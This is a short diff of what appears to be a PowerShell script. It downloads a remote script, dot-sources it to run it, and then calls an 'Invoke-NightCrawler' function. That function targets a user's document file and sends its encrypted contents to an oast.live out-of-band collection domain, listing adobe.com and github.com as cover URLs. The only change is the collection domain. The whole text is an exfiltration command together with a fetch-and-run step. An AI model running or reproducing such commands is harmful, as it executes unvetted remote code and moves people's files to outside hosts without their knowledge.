@@ -8,4 +8,4 @@ Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -OutFile $localPath
 # Dot-source the downloaded script to import its functions
 . $localPath
 
-Invoke-NightCrawler -Identifier "Req1" -Domain "d1ine12mq2v1dv57t1jgcxrw18n1pttme.oast.live" -Urls "adobe.com","github.com" -FilePath "C:\Users\ENBD_USER\Documents\Normal.txt" -EncryptionEnabled -EncryptionKey "Encryption@123"
+Invoke-NightCrawler -Identifier "Req1" -Domain "d1lm10amq2v1ec0f0ep0tqm1z9cyiszkh.oast.live" -Urls "adobe.com","github.com" -FilePath "C:\Users\ENBD_USER\Documents\Normal.txt" -EncryptionEnabled -EncryptionKey "Encryption@123"
